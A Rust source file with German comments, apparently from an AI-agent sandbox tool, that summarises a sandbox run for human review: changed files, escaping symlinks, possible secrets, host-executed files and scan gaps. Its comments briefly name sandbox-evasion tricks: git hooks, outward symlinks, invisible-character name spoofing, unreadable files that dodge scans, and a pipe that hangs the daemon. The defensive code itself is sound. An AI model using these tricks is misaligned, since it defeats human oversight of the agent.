//! Die Zusammenfassung eines Sandbox-Laufs: was im Projekt entstanden ist
//! (HUM-043).
//!
//! Der Diff zweier [`crate::worktree::TreeSnapshot`] ist das Rohmaterial;
//! [`SessionSummary`] ist das, was ein Mensch am Ende zu sehen bekommt — im
//! Sheet der Oberfläche, in der Tabelle der Kommandozeile und als
//! [`Diagnostic`].
//!
//! # Feindlicher Text
//!
//! Jeder Dateiname, jedes Symlink-Ziel und jeder Ausschnitt in dieser
//! Zusammenfassung ist vom Agenten geschrieben. Deshalb gilt hier dieselbe
//! Regel wie an den anderen Stellen des Produkts, und zwar wörtlich dieselbe
//! Funktion: [`humanitl_core::block::sanitize_note`]. Sie nimmt Steuerzeichen
//! und unsichtbare Zeichen heraus, macht Zeilenumbrüche zu Leerzeichen, kappt
//! die Bidi-Steuerzeichen, mit denen ein Name sich als ein anderer ausgeben
//! kann, begrenzt gestapelte kombinierende Zeichen und deckelt die Länge auf
//! [`humanitl_core::block::NOTE_MAX_CHARS`]. Eine zweite Regel daneben wäre
//! eine zweite Regel, die man vergessen kann.
//!
//! **Ein gesäuberter Wert ist ab da nur noch Anzeige.** Er darf nicht mehr
//! zurück in einen Pfad, einen Vergleich, einen Hash oder einen Befehl; zwei
//! verschiedene Namen können dieselbe Anzeige ergeben, und ein
//! `.gitignore\u{200b}` sieht aus wie `.gitignore`. Alles, was den rohen Wert
//! braucht, entsteht deshalb in [`SessionSummary::add_changes`], solange es
//! ihn noch gibt: die Kandidatenliste des Fundscans, [`FileChangeRecord::path_hash`],
//! [`FileChangeRecord::unprotected_by`] und [`SymlinkEscape::fix_command`]. Was
//! später kommt — [`SessionSummary::diagnostics`], die Kommandozeile, die
//! Oberfläche — sieht nur noch die Anzeige und die dort abgelegten Ergebnisse.
//!
//! Der eine Ort, an dem gesäuberter Text nicht genügt, ist [`FixAction`]: Ein
//! `CopyCommand` landet in der Shell eines Menschen. Er entsteht nur, wenn der
//! rohe Host-Pfad die Prüfung in [`copy_command`] besteht — `sanitize_note`
//! ändert ihn nicht, die Zitierung ist wörtlich, und `shlex` zerlegt sie
//! wieder in genau diesen einen Pfad. Sonst gibt es keinen Befehl, nur die
//! Anzeige.
//!
//! # Was nicht in die Zusammenfassung kommt
//!
//! Werte. Ein [`SummaryFinding`] trägt Ort, Zeile, Art, Sicherheitsstufe, den
//! Hash und höchstens acht Zeichen Anfang — genau das, was
//! [`humanitl_core::Finding`] hergibt. Der gefundene Wert bleibt in der Datei.

use std::path::{Path, PathBuf};

use humanitl_core::block::sanitize_note;
use humanitl_core::diagnostics::codes::{
    SANDBOX_022, SANDBOX_023, SANDBOX_024, SANDBOX_025, SANDBOX_026, SANDBOX_028,
};
use humanitl_core::ids::{SandboxId, SessionId};
use humanitl_core::{Diagnostic, Finding, FixAction, Severity, Tier};
use serde::{Deserialize, Serialize};

use crate::worktree::{FileChange, TreeSnapshot};

/// So viele Änderungen stehen höchstens in einer Zusammenfassung.
pub const MAX_CHANGES: usize = 2_000;

/// So viele Funde stehen höchstens in einer Zusammenfassung.
pub const MAX_FINDINGS: usize = 500;

/// So viele Symlinks stehen höchstens in einer Zusammenfassung.
pub const MAX_SYMLINKS: usize = 500;

/// So viele Bytes einer Datei entscheiden, ob sie als Text gilt.
pub const TEXT_PROBE_BYTES: usize = 8 * 1024;

/// Bis zu dieser Größe wird eine geänderte Datei gescannt.
pub const SCAN_MAX_BYTES: u64 = 4 * 1024 * 1024;

/// So viele Bytes liest der Fundscan eines Laufs insgesamt.
///
/// [`SCAN_MAX_BYTES`] deckelt die einzelne Datei, dieses Budget den ganzen
/// Lauf. Ohne das zweite wäre die Obergrenze das Produkt aus beiden Grenzen —
/// [`MAX_CHANGES`] Dateien zu je 4 MiB sind 8 GiB, die zu lesen und durch die
/// Detektoren zu schicken wären, und wie viele Dateien der Agent anlegt,
/// bestimmt der Agent. Greift das Budget, endet der Scan und
/// [`SessionSummary::truncated`] sagt es.
pub const SCAN_TOTAL_MAX_BYTES: u64 = 256 * 1024 * 1024;

/// Die Art eines Fundes, der kein Geheimnis meldet, sondern eine Datei, die
/// der Host von sich aus ausführt ([`executable_on_host`]).
///
/// Sie steht hier und nicht als Zeichenkette an zwei Stellen, weil
/// [`SessionSummary::diagnostics`] die beiden Arten auseinanderhalten muss:
/// `SANDBOX_023` zählt Geheimnisse, `SANDBOX_026` ausführbare Dateien. Der
/// Wert ist die Anzeige von
/// `humanitl_core::FindingKind::Custom("executable-on-host")`.
pub const EXECUTABLE_ON_HOST_KIND: &str = "custom:executable-on-host";

/// Die Art einer Änderung, wie sie in Protokoll, `JSON` und Oberfläche steht.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ChangeKind {
    /// Neu hinzugekommen.
    Added,
    /// Inhalt geändert.
    Modified,
    /// Verschwunden.
    Removed,
    /// Ein neuer symbolischer Verweis.
    SymlinkAdded,
    /// Nur die Rechte-Bits haben sich geändert.
    ModeChanged,
}

impl ChangeKind {
    /// Der Name in `snake_case`.
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Added => "added",
            Self::Modified => "modified",
            Self::Removed => "removed",
            Self::SymlinkAdded => "symlink_added",
            Self::ModeChanged => "mode_changed",
        }
    }
}

/// Warum der Fundscan eine geänderte Datei nicht gelesen hat.
///
/// Jeder dieser Fälle ist ein Loch in genau der Prüfung, die dieses Issue
/// liefert, und keiner darf still bleiben: Wie groß eine Datei ist, welche
/// Rechte sie trägt und wie viele davon ein Lauf schreibt, bestimmt der Agent.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ScanSkip {
    /// Über [`SCAN_MAX_BYTES`].
    TooLarge,
    /// Nicht lesbar: Rechte, verschwunden, kein gewöhnlicher Inhalt mehr.
    Unreadable,
    /// Das Byte-Budget des Laufs reichte für sie nicht mehr.
    Budget,
}

impl ScanSkip {
    /// Der Name in `snake_case`.
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::TooLarge => "too_large",
            Self::Unreadable => "unreadable",
            Self::Budget => "budget",
        }
    }

    /// Der Satz, den ein Mensch dazu liest.
    #[must_use]
    pub const fn why(self) -> &'static str {
        match self {
            Self::TooLarge => "larger than the scan reads",
            Self::Unreadable => "could not be read",
            Self::Budget => "the scan budget of this session was spent",
        }
    }
}

/// Eine geänderte Datei, die der Fundscan lesen soll.
///
/// Der Pfad ist **roh**, nicht die Anzeige: Wer mit der Anzeige öffnete,
/// öffnete eine andere Datei oder keine. `row` zeigt auf die Zeile in
/// [`SessionSummary::changes`], damit der Scan dort vermerken kann, was er
/// nicht gelesen hat ([`SessionSummary::mark_unscanned`]).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScanCandidate {
    /// Der Pfad relativ zum Projektverzeichnis, roh.
    pub path: PathBuf,
    /// Die Größe aus dem zweiten Schnappschuss.
    ///
    /// Sie entscheidet **vor** dem Lesen, ob die Datei ins Budget passt. Erst
    /// danach zu vergleichen hieße, das Budget zu überschreiten und die
    /// Überschreitung als eingehalten zu melden.
    pub size: u64,
    /// Der Platz der Zeile in [`SessionSummary::changes`].
    pub row: usize,
}

/// Der angezeigte Name eines Pfades samt dem, was die Anzeige verliert.
///
/// Drei Felder, weil ein gesäuberter Name allein zu wenig ist: Er ist nicht
/// mehr eindeutig (zwei Namen, die sich nur in einem unsichtbaren Zeichen
/// unterscheiden, ergeben dieselbe Zeile), und er sagt nicht, dass überhaupt
/// etwas weggefallen ist. Das Feld `hash` macht die Zeile wieder eindeutig,
/// `mangled` macht den Verlust sichtbar.
#[derive(Debug, Clone, PartialEq, Eq)]
struct PathView {
    text: String,
    hash: String,
    mangled: bool,
}

impl PathView {
    /// Baut die Anzeige eines Pfades aus seinen rohen Bytes.
    fn of(path: &Path) -> Self {
        let raw = path.as_os_str().as_encoded_bytes();
        let text = display_path(path);
        Self {
            mangled: text.as_bytes() != raw,
            hash: path_hash(path),
            text,
        }
    }
}

/// Eine Zeile der Tabelle „Changed files".
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct FileChangeRecord {
    /// Der Pfad relativ zu `/work`, gesäubert.
    ///
    /// Anzeige, nie ein Argument: Wer damit eine Datei öffnet, öffnet eine
    /// andere. Siehe [`SessionSummary::add_changes`].
    pub path: String,
    /// Die ersten [`PATH_HASH_CHARS`] Hex-Zeichen des `SHA-256` über die rohen
    /// Bytes des Pfades.
    ///
    /// Zwei Namen, die sich nur in einem unsichtbaren Zeichen unterscheiden,
    /// ergeben dieselbe [`FileChangeRecord::path`]; erst der Hash macht die
    /// beiden Zeilen im `JSON` und in der Oberfläche wieder unterscheidbar.
    pub path_hash: String,
    /// Ob die Anzeige den echten Namen verändert hat.
    pub mangled: bool,
    /// Was mit ihm geschehen ist.
    pub kind: ChangeKind,
    /// Die Größe nach der Änderung, `0` für Gelöschtes.
    pub size: u64,
    /// Ob der Pfad zu den Git-Metadaten gehört.
    ///
    /// `.git/index` ändert sich bei jedem `git status` des Agenten. Solche
    /// Zeilen werden gezeigt, aber die Oberfläche fasst sie unter
    /// „Git metadata" zusammen, statt sie wie eine inhaltliche Änderung zu
    /// behandeln. `.git/hooks` gehört **nicht** dazu: Was dort liegt, führt
    /// Git beim nächsten Commit aus, und eine eingeklappte Gruppe ist der
    /// falsche Ort dafür.
    pub git_metadata: bool,
    /// Der Eintrag aus [`SessionSummary::unprotected`], unter dem diese
    /// Änderung liegt, falls es einen gibt.
    ///
    /// `Some` ist zugleich die Antwort auf „lag hier keine Maske?"; der Wert
    /// daneben sagt, **welche** gefehlt hat, und erspart es, den angezeigten
    /// Pfad später noch einmal gegen die Liste zu halten — was ein Vergleich
    /// auf gesäubertem Text wäre und damit falsch.
    pub unprotected_by: Option<String>,
    /// Warum der Fundscan diese Datei nicht gelesen hat.
    ///
    /// `None` heißt: gelesen, oder es gab nichts zu lesen (ein Verzeichnis,
    /// ein Verweis, etwas Gelöschtes, eine Rechte-Änderung). `Some` heißt: In
    /// dieser Datei wurde **nicht** nach Geheimnissen gesucht, und der Grund
    /// steht dabei. Ohne dieses Feld sähe eine Zusammenfassung, in der eine
    /// 5-MiB-Datei oder eine unlesbare Datei übersprungen wurde, genauso aus
    /// wie eine, in der nichts gefunden wurde.
    pub unscanned: Option<ScanSkip>,
}

/// Ein Symlink, den der Agent angelegt hat.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SymlinkEscape {
    /// Der Verweis, relativ zu `/work`, gesäubert. Anzeige, nie ein Argument.
    pub path: String,
    /// Die ersten [`PATH_HASH_CHARS`] Hex-Zeichen des `SHA-256` über die rohen
    /// Bytes des Verweises.
    pub path_hash: String,
    /// Ob die Anzeige von Verweis oder Ziel den echten Namen verändert hat.
    pub mangled: bool,
    /// Das Ziel, wörtlich wie es im Verweis steht, gesäubert und nie aufgelöst.
    pub target: String,
    /// Ob das Ziel aus `/work` hinausführt.
    pub escapes: bool,
    /// Der Befehl für die Zwischenablage, aus dem **rohen** Host-Pfad gebaut,
    /// oder `None`.
    ///
    /// Er entsteht beim Eintragen und nicht erst in
    /// [`SessionSummary::diagnostics`], und zwar aus zwei Gründen. Erstens
    /// steht in [`SymlinkEscape::path`] nur noch der gesäuberte Name; ein
    /// Befehl daraus zeigte auf eine andere Datei — bei
    /// `.gitignore\u{200b}` auf die echte `.gitignore` des Nutzers. Zweitens
    /// wird die Zusammenfassung als `JSON` abgelegt; der rohe Pfad ist danach
    /// weg, und was nicht jetzt gerechnet wird, lässt sich nie mehr rechnen.
    pub fix_command: Option<String>,
}

/// Ein Fund in einer Datei, die dieser Lauf geändert hat.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SummaryFinding {
    /// Die Datei relativ zu `/work`, gesäubert. Anzeige, nie ein Argument.
    pub path: String,
    /// Die ersten [`PATH_HASH_CHARS`] Hex-Zeichen des `SHA-256` über die rohen
    /// Bytes des Pfades.
    pub path_hash: String,
    /// Ob die Anzeige den echten Namen verändert hat.
    pub mangled: bool,
    /// Die Zeile, 1-basiert. Die Oberfläche hat die Datei nicht, also rechnet
    /// der Daemon.
    pub line: u32,
    /// Die Art des Fundes, `snake_case`, mit Parameter (`api_key:github`).
    pub kind: String,
    /// Wie sicher der Fund ist.
    pub tier: Tier,
    /// Höchstens acht Zeichen des Originals, danach `…`.
    pub display_prefix: String,
    /// `SHA-256` des gefundenen Werts als Hex, damit zwei Funde als gleich
    /// erkannt werden können, ohne den Wert zu tragen.
    pub value_hash: String,
}

impl SummaryFinding {
    /// Übersetzt einen Fund der Detektoren in eine Zeile der Zusammenfassung.
    ///
    /// `bytes` ist der Inhalt, in dem gesucht wurde; daraus rechnet diese
    /// Funktion die Zeile ([`line_of`]). `path` ist der **rohe** Pfad relativ
    /// zu `/work`; die Anzeige entsteht hier.
    #[must_use]
    pub fn from_finding(path: &Path, bytes: &[u8], finding: &Finding) -> Self {
        let view = PathView::of(path);
        Self {
            path: view.text,
            path_hash: view.hash,
            mangled: view.mangled,
            line: line_of(bytes, finding.span.start),
            kind: finding.kind.to_string(),
            tier: finding.tier,
            display_prefix: sanitize_note(&finding.display_prefix),
            value_hash: finding.value_hash_hex(),
        }
    }

    /// Der Fund, den [`executable_on_host`] auslöst: die Datei selbst.
    ///
    /// Es gibt hier keinen gefundenen Wert — nicht die Zeile eines Musters ist
    /// der Fund, sondern die Datei, die der Host beim nächsten `git commit`,
    /// `make` oder `npm install` startet. [`SummaryFinding::display_prefix`]
    /// und [`SummaryFinding::value_hash`] bleiben deshalb leer; der Hash der
    /// leeren Zeichenkette stünde dort wie ein Wert, den es nie gab. Die Zeile
    /// ist `1`: Die Datei als Ganzes ist gemeint.
    ///
    /// `path` ist der **rohe** Pfad relativ zu `/work`; die Anzeige entsteht
    /// hier.
    #[must_use]
    pub fn executable_on_host(path: &Path) -> Self {
        let view = PathView::of(path);
        Self {
            path: view.text,
            path_hash: view.hash,
            mangled: view.mangled,
            line: 1,
            kind: EXECUTABLE_ON_HOST_KIND.to_owned(),
            tier: Tier::Regex,
            display_prefix: String::new(),
            value_hash: String::new(),
        }
    }

    /// Ob dieser Fund eine Datei meldet, die der Host ausführt, statt eines
    /// möglichen Geheimnisses.
    #[must_use]
    pub fn is_executable_on_host(&self) -> bool {
        self.kind == EXECUTABLE_ON_HOST_KIND
    }
}

/// Was ein Sandbox-Lauf im Projektverzeichnis hinterlassen hat.
///
/// Die Zusammenfassung gehört zum **Sandbox-Lauf**, nicht zur Sitzung des
/// Daemons: `humanitld` hat genau eine [`SessionId`] je Prozess, und die
/// Sandbox startet und stoppt darin beliebig oft. Die Kennung des Laufs ist
/// die [`SandboxId`], die [`crate::SandboxHandle`] ohnehin trägt; ein eigener
/// Id-Typ dafür wäre ein zweiter Name für dieselbe Sache.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SessionSummary {
    /// Die Sitzung des Daemons.
    pub session: SessionId,
    /// Der Sandbox-Lauf.
    pub sandbox: SandboxId,
    /// Das Projektverzeichnis auf dem Host, aus der Konfiguration.
    ///
    /// Nie aus der Zusammenfassung selbst: „Open folder" der Oberfläche nimmt
    /// diesen Pfad, nicht einen aus dem Baum.
    pub work_dir: String,
    /// Die Änderungen, sortiert nach Pfad.
    pub changes: Vec<FileChangeRecord>,
    /// Die Funde in geänderten Dateien.
    pub findings: Vec<SummaryFinding>,
    /// Die Symlinks, die dieser Lauf angelegt hat.
    pub symlinks: Vec<SymlinkEscape>,
    /// Die Überdeckungen, die in diesem Lauf gefehlt haben, relativ zum
    /// Projektverzeichnis (`LaunchPlan::unprotected`).
    ///
    /// Beide Arten: die Verzeichnisse aus `mounts.tmpfs` unter `/work` und die
    /// Dateien aus `mounts.masked_files`. `bwrap` hängt nur über einen
    /// Mountpoint ein, den es gibt; fehlt der Pfad im Projekt, liegt nichts
    /// darüber.
    ///
    /// Humanitl legt sie nicht an — der Daemon schreibt nichts in das Projekt
    /// des Nutzers. Was der Agent dort schreibt, landet auf dem Host und steht
    /// deshalb zugleich als neue Datei in [`SessionSummary::changes`]; diese
    /// Liste sagt, warum die Überdeckung gefehlt hat.
    pub unprotected: Vec<String>,
    /// So viele Bytes hat der Scan gelesen.
    pub scanned_bytes: u64,
    /// Ob ein Budget gegriffen hat: im Schnappschuss, in einer der Listen
    /// dieser Zusammenfassung oder im Fundscan
    /// ([`SCAN_TOTAL_MAX_BYTES`]). Eine abgeschnittene Zusammenfassung darf
    /// nie aussehen wie eine vollständige.
    pub truncated: bool,
}

impl SessionSummary {
    /// Eine leere Zusammenfassung für einen Lauf.
    #[must_use]
    pub fn new(session: SessionId, sandbox: SandboxId, work_dir: &Path) -> Self {
        Self {
            session,
            sandbox,
            work_dir: work_dir.to_string_lossy().into_owned(),
            changes: Vec::new(),
            findings: Vec::new(),
            symlinks: Vec::new(),
            unprotected: Vec::new(),
            scanned_bytes: 0,
            truncated: false,
        }
    }

    /// Trägt den Diff zweier Schnappschüsse ein und liefert zurück, was der
    /// Fundscan lesen soll.
    ///
    /// Symlinks landen zusätzlich in [`SessionSummary::symlinks`]; die
    /// Budgets [`MAX_CHANGES`] und [`MAX_SYMLINKS`] setzen
    /// [`SessionSummary::truncated`], statt die Liste wachsen zu lassen.
    ///
    /// **Die Rückgabe trägt die rohen Pfade, nicht die angezeigten.** In
    /// [`FileChangeRecord::path`] steht der Name, wie ein Mensch ihn sehen
    /// darf: durch [`sanitize_note`] gegangen, also ohne Steuerzeichen und mit
    /// Längendeckel. Damit lässt sich keine Datei mehr öffnen — der Name wäre
    /// ein anderer. Wer die Dateien liest, nimmt diese Liste; sie enthält jede
    /// gewöhnliche Datei, die neu ist oder sich geändert hat, ohne Symlinks,
    /// ohne Verzeichnisse, ohne Gelöschtes, jeweils relativ zu `/work` und mit
    /// ihrer Größe.
    ///
    /// Die Größe ist **nicht** vorsortiert: Was der Scan nicht liest,
    /// entscheidet der Scan, und er vermerkt es an der Zeile
    /// ([`SessionSummary::mark_unscanned`]). Eine Datei hier auszulassen hieße,
    /// sie spurlos verschwinden zu lassen.
    ///
    /// Aus demselben Grund entsteht hier auch schon
    /// [`SymlinkEscape::fix_command`]: `root` ist das echte
    /// Projektverzeichnis auf dem Host, und der rohe Name des Verweises gibt es
    /// nur in diesem Moment.
    ///
    /// [`SessionSummary::set_unprotected`] gehört **vor** diesen Aufruf; sonst
    /// bleibt [`FileChangeRecord::unprotected_by`] überall `None`.
    pub fn add_changes(
        &mut self,
        root: &Path,
        before: &TreeSnapshot,
        after: &TreeSnapshot,
    ) -> Vec<ScanCandidate> {
        self.truncated |= before.truncated() || after.truncated();
        let unprotected: Vec<PathBuf> = self.unprotected.iter().map(PathBuf::from).collect();
        let mut candidates = Vec::new();
        for change in crate::worktree::diff(before, after) {
            if let FileChange::SymlinkAdded {
                path,
                target,
                escapes,
            } = &change
            {
                if self.symlinks.len() >= MAX_SYMLINKS {
                    self.truncated = true;
                } else {
                    let view = PathView::of(path);
                    let target_view = PathView::of(target);
                    self.symlinks.push(SymlinkEscape {
                        path: view.text,
                        path_hash: view.hash,
                        mangled: view.mangled || target_view.mangled,
                        target: target_view.text,
                        escapes: *escapes,
                        fix_command: copy_command(&root.join(path)),
                    });
                }
            }
            if self.changes.len() >= MAX_CHANGES {
                self.truncated = true;
                continue;
            }
            let path = change.path();
            let entry = after.get(path);
            let size = entry.map_or(0, |entry| entry.size);
            // Ein Verzeichnis unter einer Lücke ist keine geschriebene Datei,
            // sondern der Mountpoint, den der Agent selbst anlegen musste, um
            // darunter zu schreiben. Es als Fund zu zählen, machte aus einem
            // Hook zwei Einträge und stellte das Verzeichnis als „erste
            // betroffene Datei" vor die Datei, um die es geht.
            let is_dir = matches!(
                entry.map(|entry| &entry.kind),
                Some(crate::worktree::Kind::Dir)
            );
            let kind = kind_of(&change);
            // **Nur gewöhnliche Dateien.** Ein Verzeichnis ließe sich nicht
            // lesen, und eine benannte Röhre (`mkfifo`) ließe den Daemon im
            // `open` hängen, bis jemand hineinschreibt — der Agent legt an,
            // was er will. Was der Schnappschuss als `Kind::Other` gesehen
            // hat, wird deshalb gar nicht erst zum Kandidaten.
            //
            // Die Größe entscheidet hier **nicht** mehr. Wer sie hier
            // aussortierte, ließe eine Datei über [`SCAN_MAX_BYTES`] spurlos
            // aus der Zusammenfassung fallen: kein Scan, kein Vermerk, ein
            // Bericht, der vollständig aussieht. Der Scan entscheidet, und was
            // er nicht liest, steht als
            // [`FileChangeRecord::unscanned`] in seiner Zeile.
            let is_file = matches!(
                entry.map(|entry| &entry.kind),
                Some(crate::worktree::Kind::File)
            );
            if is_file && matches!(kind, ChangeKind::Added | ChangeKind::Modified) {
                candidates.push(ScanCandidate {
                    path: path.to_path_buf(),
                    size,
                    row: self.changes.len(),
                });
            }
            let view = PathView::of(path);
            self.changes.push(FileChangeRecord {
                path: view.text,
                path_hash: view.hash,
                mangled: view.mangled,
                kind,
                size,
                git_metadata: is_git_metadata(path),
                unprotected_by: if is_dir {
                    None
                } else {
                    unprotected
                        .iter()
                        .find(|gap| path == *gap || path.starts_with(gap))
                        .map(|gap| gap.to_string_lossy().into_owned())
                },
                unscanned: None,
            });
        }
        candidates
    }

    /// Trägt die Pfade ein, über denen in diesem Lauf keine Maske lag.
    ///
    /// `relative` sind Pfade relativ zum Projektverzeichnis, so wie
    /// `LaunchPlan::unprotected` sie liefert. Sie kommen aus dem Profil und
    /// nicht vom Agenten; deshalb — und nur deshalb — gehen sie ungesäubert in
    /// die Liste und dürfen zum Vergleich benutzt werden.
    ///
    /// Der Aufruf gehört vor [`SessionSummary::add_changes`], die daraus
    /// [`FileChangeRecord::unprotected_by`] setzt.
    pub fn set_unprotected(&mut self, relative: &[PathBuf]) {
        self.unprotected = relative
            .iter()
            .map(|path| path.to_string_lossy().into_owned())
            .collect();
    }

    /// Vermerkt, dass der Fundscan diese Zeile nicht gelesen hat.
    ///
    /// `row` ist [`ScanCandidate::row`]. Der Vermerk setzt zugleich
    /// [`SessionSummary::truncated`]: Eine Zusammenfassung, in der eine
    /// geänderte Datei ungelesen blieb, ist nicht vollständig, und sie darf
    /// nicht aussehen, als wäre sie es.
    ///
    /// **Das ist die Gegenprobe zum leisen Überspringen.** Eine Datei, die
    /// sich nicht lesen lässt, gehört dem Agenten: Er bestimmt die Rechte an
    /// dem, was er schreibt, und ohne diesen Vermerk verschwände sie aus dem
    /// Geheimnis-Scan, während der Bericht vollständig aussieht.
    pub fn mark_unscanned(&mut self, row: usize, why: ScanSkip) {
        self.truncated = true;
        if let Some(change) = self.changes.get_mut(row) {
            change.unscanned = Some(why);
        }
    }

    /// Trägt einen Fund ein, solange [`MAX_FINDINGS`] es zulässt.
    pub fn add_finding(&mut self, finding: SummaryFinding) {
        if self.findings.len() >= MAX_FINDINGS {
            self.truncated = true;
            return;
        }
        self.findings.push(finding);
    }

    /// Die Befunde, die ein Mensch zu dieser Zusammenfassung sehen soll.
    ///
    /// `SANDBOX_022` je Symlink, dessen Ziel aus `/work` hinausführt,
    /// `SANDBOX_023` einmal, wenn mögliche Geheimnisse in geänderten Dateien
    /// stecken, `SANDBOX_026` einmal, wenn der Lauf eine Datei hinterlassen
    /// hat, die der Host ausführt, `SANDBOX_024` einmal, wenn ein Budget
    /// gegriffen hat, `SANDBOX_025` einmal, wenn eine Änderung unter einem
    /// Pfad liegt, über dem keine Maske lag.
    ///
    /// Geheimnisse und ausführbare Dateien stehen beide in
    /// [`SessionSummary::findings`] und werden hier getrennt gezählt
    /// ([`SummaryFinding::is_executable_on_host`]). Ein `Makefile`, das der
    /// Agent geschrieben hat, als „mögliches Geheimnis" zu melden, wäre eine
    /// falsche Auskunft über beide Zahlen.
    #[must_use]
    pub fn diagnostics(&self) -> Vec<Diagnostic> {
        let mut out = self.symlink_diagnostics();
        out.extend(self.unprotected_diagnostic());
        out.extend(self.secret_diagnostic());
        out.extend(self.executable_diagnostic());
        out.extend(self.unscanned_diagnostic());
        out.extend(self.truncated_diagnostic());
        out
    }

    /// `SANDBOX_022` je Symlink, dessen Ziel aus `/work` hinausführt.
    fn symlink_diagnostics(&self) -> Vec<Diagnostic> {
        self.symlinks
            .iter()
            .filter(|link| link.escapes)
            .map(|link| {
                let mut builder = Diagnostic::builder(SANDBOX_022, Severity::Warning).why(format!(
                    "the agent created a symlink {} pointing outside the project ({}); do not \
                     follow it",
                    link.path, link.target
                ));
                // Der Befehl ist beim Eintragen aus dem rohen Pfad entstanden;
                // hier gibt es ihn nicht mehr, und es wäre der falsche Pfad.
                if let Some(command) = link.fix_command.clone() {
                    builder = builder.fix(FixAction::CopyCommand(command));
                }
                builder.build()
            })
            .collect()
    }

    /// `SANDBOX_025`, wenn der Agent unter einem Pfad geschrieben hat, über dem
    /// keine Maske lag.
    ///
    /// Genannt werden nur die Lücken, unter denen wirklich etwas entstanden
    /// ist. Die ganze Liste aus [`SessionSummary::unprotected`] wären in einem
    /// nackten Projekt fünfzehn Einträge, und daneben eine Zahl, die sich auf
    /// die Dateien bezieht: Das läse sich, als sei an fünfzehn Stellen etwas
    /// passiert.
    fn unprotected_diagnostic(&self) -> Option<Diagnostic> {
        let written: Vec<&FileChangeRecord> = self
            .changes
            .iter()
            .filter(|change| change.unprotected_by.is_some())
            .filter(|change| !matches!(change.kind, ChangeKind::Removed))
            .collect();
        let first = written.first()?;
        let mut hit: Vec<&str> = written
            .iter()
            .filter_map(|change| change.unprotected_by.as_deref())
            .collect();
        hit.sort_unstable();
        hit.dedup();
        Some(
            Diagnostic::builder(SANDBOX_025, Severity::Warning)
                .why(format!(
                    "the agent wrote {} file(s) below {}, which this profile masks but which did \
                     not exist in the project, so nothing was mounted over them; the first is {}. \
                     Read those before the next commit: the host runs what lies there.",
                    written.len(),
                    hit.join(", "),
                    first.path
                ))
                .build(),
        )
    }

    /// `SANDBOX_023`, wenn mögliche Geheimnisse in geänderten Dateien stecken.
    fn secret_diagnostic(&self) -> Option<Diagnostic> {
        let secrets = self
            .findings
            .iter()
            .filter(|finding| !finding.is_executable_on_host())
            .count();
        (secrets > 0).then(|| {
            Diagnostic::builder(SANDBOX_023, Severity::Warning)
                .why(format!(
                    "{secrets} potential secret(s) were written into the project during this \
                     session"
                ))
                .build()
        })
    }

    /// `SANDBOX_026`, wenn der Lauf eine Datei hinterlassen hat, die dieser
    /// Rechner von selbst ausführt.
    fn executable_diagnostic(&self) -> Option<Diagnostic> {
        let executable: Vec<&SummaryFinding> = self
            .findings
            .iter()
            .filter(|finding| finding.is_executable_on_host())
            .collect();
        let first = executable.first()?;
        Some(
            Diagnostic::builder(SANDBOX_026, Severity::Warning)
                .why(format!(
                    "the agent wrote {} file(s) that this machine runs on its own — at the next \
                     commit, build or install; the first is {}. Read them before you work in the \
                     project again.",
                    executable.len(),
                    first.path
                ))
                .build(),
        )
    }

    /// `SANDBOX_028`, wenn der Fundscan in eine geänderte Datei nicht gesehen
    /// hat.
    ///
    /// Das ist etwas anderes als eine abgeschnittene Liste: Dort fehlt eine
    /// Zeile, hier fehlt der Blick in eine Datei, die der Agent geändert hat.
    /// `SANDBOX_024` sagt „nicht alles", `SANDBOX_028` sagt „in diesen nicht
    /// nachgesehen" — und nur die zweite Aussage verhindert, dass ein Mensch
    /// „kein Fund" als „sauber" liest.
    fn unscanned_diagnostic(&self) -> Option<Diagnostic> {
        let unscanned: Vec<&FileChangeRecord> = self
            .changes
            .iter()
            .filter(|change| change.unscanned.is_some())
            .collect();
        let first = unscanned.first()?;
        let why = first.unscanned?;
        Some(
            Diagnostic::builder(SANDBOX_028, Severity::Warning)
                .why(format!(
                    "{} changed file(s) were not searched for secrets; the first is {} ({}). \
                     Nothing was found in them because nothing was looked at.",
                    unscanned.len(),
                    first.path,
                    why.why()
                ))
                .build(),
        )
    }

    /// `SANDBOX_024`, wenn irgendein Budget gegriffen hat.
    fn truncated_diagnostic(&self) -> Option<Diagnostic> {
        self.truncated.then(|| {
            Diagnostic::builder(SANDBOX_024, Severity::Info)
                .why(
                    "a budget cut this session short: the walk over the project directory, one of \
                     the lists here, or the scan for secrets stopped before the end. What you see \
                     is what fits, not everything that changed"
                        .to_owned(),
                )
                .build()
        })
    }
}

/// Die Art einer Änderung als [`ChangeKind`].
fn kind_of(change: &FileChange) -> ChangeKind {
    match change {
        FileChange::Added(_) => ChangeKind::Added,
        FileChange::Modified(_) => ChangeKind::Modified,
        FileChange::Removed(_) => ChangeKind::Removed,
        FileChange::SymlinkAdded { .. } => ChangeKind::SymlinkAdded,
        FileChange::ModeChanged(_) => ChangeKind::ModeChanged,
    }
}

/// Ob ein Pfad zu den Git-Metadaten gehört.
///
/// `.git/index`, `.git/HEAD` und die Refs ändern sich bei jedem `git status`
/// des Agenten; die Oberfläche fasst sie zusammen. `.git/hooks` ist
/// ausgenommen: Was dort liegt, führt Git beim nächsten Commit aus. Eine
/// eingeklappte Gruppe „Git metadata" wäre genau der Ort, an dem ein Hook
/// niemandem auffällt.
fn is_git_metadata(path: &Path) -> bool {
    path.starts_with(".git") && !path.starts_with(".git/hooks")
}

/// Ein Pfad, wie er angezeigt werden darf.
///
/// Der Name kommt vom Agenten; er geht durch dieselbe Säuberung wie jede
/// andere fremde Zeichenkette im Produkt. **Das Ergebnis ist Anzeige und nie
/// wieder ein Pfad**: Es lässt sich damit keine Datei öffnen, kein Befehl
/// bauen und nichts vergleichen, weil zwei verschiedene Namen dieselbe Anzeige
/// ergeben können.
#[must_use]
pub fn display_path(path: &Path) -> String {
    sanitize_note(&path.to_string_lossy())
}

